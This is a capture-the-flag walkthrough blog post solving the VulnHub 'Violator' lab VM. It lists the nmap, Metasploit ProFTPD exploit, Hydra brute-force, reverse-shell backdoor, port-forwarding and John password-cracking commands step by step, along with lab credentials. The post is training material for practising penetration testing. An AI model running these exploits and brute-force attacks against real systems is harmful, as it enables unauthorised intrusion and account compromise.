<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Violator (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-violator-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-20T09:39:02+00:00">July 20, 2018</time><time class="updated" datetime="2025-06-10T20:29:45+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Welcome to another boot2root / CTF this one is called Violator. The VM is set to grab a DHCP lease on boot. As, there is a theme, and you will need to snag the flag in order to complete the challenge. for  downloading open this link: </span><span style="color: #3366ff;">https://www.vulnhub.com/entry/violator-1,153/</span></p>
<p><em><span style="color: #000000;">Some hints for you:</span></em></p>
<ul>
<li><span style="color: #000000;">Vince Clarke can help you with the Fast Fashion.</span></li>
<li><span style="color: #000000;">The challenge isn’t over with root. The flag is something special.</span></li>
<li><span style="color: #000000;">I have put a few trolls in, but only to sport with you.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Penetrating Methodologies </strong></span></p>
<ul>
<li><span style="color: #000000;">Network scanning (netdiscover, nmap)</span></li>
<li><span style="color: #000000;">Abusing HTTP web Pages</span></li>
<li><span style="color: #000000;">Dictionary generating (password)</span></li>
<li><span style="color: #000000;">Exploit ProFTPD 1.3.5rc3 (Metasploit)</span></li>
<li><span style="color: #000000;">Dictionary generating (username)</span></li>
<li><span style="color: #000000;">FTP Brute-force attack (Hydra)</span></li>
<li><span style="color: #000000;">Find faith_and_devotion file</span></li>
<li><span style="color: #000000;">Post-exploit ProFTPD-Backdoor(Metasploit)</span></li>
<li><span style="color: #000000;">Get root access</span></li>
<li><span style="color: #000000;">Download password protected RAR file</span></li>
<li><span style="color: #000000;">Crack password (John)</span></li>
<li><span style="color: #000000;">Extract hidden text behind Image (ExifTool)</span></li>
<li><span style="color: #000000;">Decrypt the cipher (Enigma Machine cipher)</span></li>
<li><span style="color: #000000;">Tweet author</span></li>
</ul>
<p><span style="color: #000000;">Let’s Start!!!</span></p>
<p><span style="color: #000000;">Let’s start with getting to know the IP of VM (Here, I have it at 192.168.1.104 but you will have to find your own)</span></p>
<pre class="lang:default decode:true ">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qXGA3GENefU/W1GoLgPsCiI/AAAAAAAAYX0/jDg1dvh8ETM7ulIGkP-2aKgm7ZNsAbHgQCLcBGAs/s1600/1.png"/></span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.104</pre>
<p><span style="color: #000000;">From its scanning result, I found port 21 and 80 is opened, lets explored them.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5rzRK0bJpaM/W1GoOChvzaI/AAAAAAAAYYY/CYjOB9GIcdg0Z4xtGSMLkrXflb3B1uAqgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Knowing port 80 is open in the victim’s network I preferred to explore his IP in the browser. At first glance, we saw the following web page.  When couldn’t found something suspicious, so we try to check its source-code</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sg-hc1a9sSk/W1GoOhCrkdI/AAAAAAAAYYc/QEDLTiURMjAK39_LOj0WN6XNCzq7b33RACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Hmmm!! After exploring the source code page, I found the URL given for “Wikipedia” and it looks a little bit doubtful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-x4cfGuUOdc8/W1GoOp9s_mI/AAAAAAAAYYg/QLzSLlF6wCQJ4-uczLT0PHTLF7Dp7L-BgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">When I opened above mention URL, then we got a Wikipedia page for “violator (album)”. Might be the author has left this URL as a hint for password dictionary?</span></p>
<p><span style="color: #000000;">And at the end of this page, you will notice some tracklist written by <strong>Martin L. Gore</strong>. We copied all 9 music track title in the text file by deleting space between phases of the word and saved as <strong>dict.txt</strong>, so that we can use it later.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5cDGH5klmVc/W1GoOzquPNI/AAAAAAAAYYk/AIGEuh0ndWQsMcr582l8FIMj4MJRfjFLACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Since we have enumerated the ftp (ProFTPD 1.3.5rc3) was running in victim’s pc so we check its exploit in Metasploit and luckily I found ProFTPD 1.3.5rc3 was exploitable. Therefore I execute the following command to launch the attack against ftp to gain command shell of the victim’s machine.</span></p>
<pre class="lang:default decode:true">use exploit/unix/ftp/proftpd_modcopy_exec
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set rhost 192.168.1.104
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set SITEPATH /var/www/html
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; exploit</pre>
<p><span style="color: #000000;">Booomm!! We got command shell of victim’s machine in our Metasploit framework and after then finished the task by grabbing the flag.txt file. Further, I execute the following command for extracting more information for post exploitation.</span></p>
<p><span style="color: #000000;">I love meterpreter session, therefore, firstly I had upgraded command session into meterpreter session and then move inside /home directory to identify user’s directories.</span></p>
<pre class="lang:default decode:true">sessions -u 1
sessions 2
cd /home
ls</pre>
<p><span style="color: #000000;">As we know home directory always holds some directories for the system’s users and here found 4 directories.</span></p>
<p><span style="color: #000000;">Since we have <strong>the dict.txt</strong> file generated above with the help of Wikipedia; let’s add these 4 names (af, aw dg, mg,) in a text file and saved as <strong>user.txt.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-o4t0TuMupv0/W1GoPPRFYbI/AAAAAAAAYYo/IH7Zy07kyxIZfEEqtCUw7oCwV1HcFFCBACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">As we have created a dictionary for user-pass combination, so let’s use it for FTP brute-force attack. With help of the following command, we try to crack the password for FTP and successfully obtained two credential for FTP login.</span></p>
<pre class="lang:default decode:true">hydra -L user.txt -P dict.txt -u 192.168.1.104 ftp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V9lPfHpZNOo/W1GoPkjKb3I/AAAAAAAAYYw/2lAgmQKh0m0o9H8t20wNLA7D7Z2o8_iQwCLcBGAs/s1600/7.1.png"/></span></p>
<p><span style="color: #000000;">With help of above credential, we logged into FTP as <strong>af</strong> and fetched <em>faith_and_devotion</em> from inside the path <strong>/home/mg.</strong></span></p>
<pre class="lang:default decode:true">ftp 192.168.1.104
user: af
password: enjoythesilence
get faith_and_devotion</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Z2GSOPXlbKA/W1GoPYMO6AI/AAAAAAAAYYs/94nVqG6ISVcZBIzJfBEx50W5caNEc80iwCLcBGAs/s1600/7.2.png"/></span></p>
<p><span style="color: #000000;">After downloading the file in our local machine, we open it through cat command and notice given Lyrics. This could be some kind of hint which the author has left for us.</span></p>
<pre class="lang:default decode:true">cat faith_and_devotion</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-19kUYvofwf4/W1GoP61Pb8I/AAAAAAAAYY0/cQ5PVFZDVIo-Thykjrb8ZoZt7xD-AdnnwCLcBGAs/s1600/7.3.png"/></span></p>
<p><span style="color: #000000;">So I use Google to get closer to Wermacht (Wehrmacht) with 3 rotator as suggested by author to use. I found it something related to <strong>Enigma Machine cipher</strong>.</span></p>
<p><span style="color: #000000;"><strong>Conclusion:</strong> Might be the final flag has been encrypted by using enigma machine cipher and with help of <em>faith_and_devotion</em> file instruction we can decrypt that encryption.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-q5erzExxrFY/W1GoQBwUT6I/AAAAAAAAYY8/5KtAh9xtWaAYon9FNgZ_do6Mo2Iys52zACLcBGAs/s1600/7.4.png"/></span></p>
<p><span style="color: #000000;">Coming back to the meterpreter shell, then we move ahead and I found the configuration file of proftpd from inside /dg/bd/etc.</span></p>
<pre class="lang:default decode:true">cd /home
ls
cd dg
ls
cd bd
ls
cd etc
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nwGOFhOIpik/W1GoQJi6U_I/AAAAAAAAYY4/gl0Mk7qX8tcZox8ld5FvxPwzMRzwheHawCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then with help of cat command, we opened this file and notice the FTP listening port is 2121.</span></p>
<pre class="lang:default decode:true">cat proftpd.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NL40jtEkzvw/W1GoQnp8LsI/AAAAAAAAYZA/qqcVmvZMDCYnpOEujW-dha7mfni9Pd2QwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Then with help of the following command, we got proper tty shell of victim’s VM machine and check sudo permission for user:dg.</span></p>
<pre class="lang:default decode:true">shell
python -c 'import pty;pty.spawn("/bin/bash")'
su dg
policyoftruth
sudo -l</pre>
<p><span style="color: #000000;">Here you can observe the user: dg can run proftpd as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PZC7k84m1mM/W1GoLrYw0BI/AAAAAAAAYXw/UbJ7DNMxE34Fbs1tHLL_LwpVBdgQhk7oQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Then we ran the following command to check network status for all TCP port but couldn’t saw port 2121 at Listen state.</span></p>
<pre class="lang:default decode:true">netsat -antp</pre>
<p><span style="color: #000000;">Then we ran proftpd with sudo then again check network status for all TCP port and this time found port 2121 at Listen state.</span></p>
<pre class="lang:default decode:true">sudo /home/dg/bd/sbin/proftpd
netsat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZAJMryjqV-U/W1GoL9mujGI/AAAAAAAAYX4/-NC_LGRsbAIupZ45SZ3hSqShjPevx2EAgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Thus we have forwarded the remote service at our local network to set-up TCP relay with help of below commands:</span></p>
<pre class="lang:default decode:true">portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1</pre>
<p><span style="color: #000000;">Then quickly search for Metasploit exploit for ProFTPD and luckily found “ProFTPD-1.3.3c Backdoor Command Execution” as this module exploits a malicious backdoor that was added to the ProFTPD download archive.</span></p>
<p><span style="color: #000000;">Thus to launch the attack type:</span></p>
<pre class="lang:default decode:true">use exploit/unix/ftp/proftpd_133c_backdoor
msf exploit(proftpd_133c_backdoor) &gt; set payload cmd/unix/reverse_perl
msf exploit(proftpd_133c_backdoor) &gt; set lhost 192.168.1.107
msf exploit(proftpd_133c_backdoor) &gt; set rhost 127.0.0.1
msf exploit(proftpd_133c_backdoor) &gt; set rport 2121
msf exploit(proftpd_133c_backdoor) &gt; exploit</pre>
<p><span style="color: #000000;">Yuppie!! We got command shell session 3 with root privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3R2G5KYaPs8/W1GoMte_6xI/AAAAAAAAYYA/hGcoFWO3sWUUUq76IeXwXvpBCkcJ8CtgQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">So we have root access of victim’s machine, therefore, let’s quickly get to the final flag, but as I told you that I love meterpreter session so let’s upgrade this command shell session also.</span></p>
<pre class="lang:default decode:true">sessions -u 3
sessions 4
cd /root
ls</pre>
<p><span style="color: #000000;">Here you will get a directory /basildon and a file flag.txt. By reading the flag.txt you will realize, it is not the original flag.txt file which author has asked to capture. Therefore we <strong>downloaded /basildon</strong> rar file in our local system.</span></p>
<pre class="lang:default decode:true">download .basildon /root/Desktop/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vhdph-cEics/W1GoMhne9qI/AAAAAAAAYX8/1Cxfo7SkQY4JD1I5M74n7LFpRDMBTYh-QCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">It was a password-protected RAR file, that contains an image file and to extract this folder we required the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-881e9FZToBs/W1GoM6GTHlI/AAAAAAAAYYE/XMPb9khmh_Q4WOb5Wvsr7bkp6Md5u4ZeQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now John cannot directly crack this key, first, we will have to change its format, which can be done using a john utility called “rar2john”.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> rar2john [location of key]</span></p>
<pre class="lang:default decode:true">rar2john crocs.rar &gt; hash</pre>
<p><span style="color: #000000;">Now let’s use John the Ripper to crack this hash with help of wordlist we have generated above.</span></p>
<pre class="lang:default decode:true">john hash --wordlist=dict.txt</pre>
<p><span style="color: #000000;">So the password for crocs.rar is “World in My Eyes”; let’s open the folder and get the image “artwork.jpg”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-FSbzLCKG3PQ/W1GoNKU_WwI/AAAAAAAAYYI/gkGjKoBYGCw9vhGjs2c5SchQzj0O1KYIACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">So we got below image of violator and I was pretty sure that it must be holding hidden message for the flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--UgBtcDsmcI/W1GoNjfBdlI/AAAAAAAAYYM/Y1qnOiaJG-slumzWuDvZ1U71w6fBKbEKgCLcBGAs/s1600/18.jpg"/></span></p>
<p><span style="color: #000000;">Thus we used ExifTool for extracting metadata from inside it. And after running following command we found the ciphertext. Let me remind you that, in above enumerated “<em>faith_and_devotion</em>” file we got some hint for <strong>Enigma Machine Cipher</strong>. </span></p>
<pre class="lang:default decode:true ">exiftool artwork.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iVtcibmuCBs/W1GoNkUZOGI/AAAAAAAAYYQ/H40tv7DOnTUIfevBGz8zed5pxrxYLwsxwCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Copy the ciphertext and then open this <a style="color: #000000;" href="https://www.dcode.fr/enigma-machine-cipher"><span style="color: #3366ff;">link</span></a> for decrypting enigma and past the cipher. Then use <strong>faith_and_devotion</strong> text as instructions. </span></p>
<p><span style="color: #000000;">* Use Wermacht with 3 rotors</span></p>
<p><span style="color: #000000;">* Reflector to B</span></p>
<p><span style="color: #000000;">Initial: A B C</span></p>
<p><span style="color: #000000;">Alphabet Ring: C B A</span></p>
<p><span style="color: #000000;">Plug Board A-B, C-D</span></p>
<p><span style="color: #000000;">Hurray!!! We got the plaintext message. The message was “ONE FINAL CHALLENGE FOR YOU BGHX” and to get this final flag you can tweet the author.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NKzszMeC24k/W1GoN1hB2jI/AAAAAAAAYYU/HiC2UQYB4y0CuTPKUTifnL52kXalWPz3ACLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
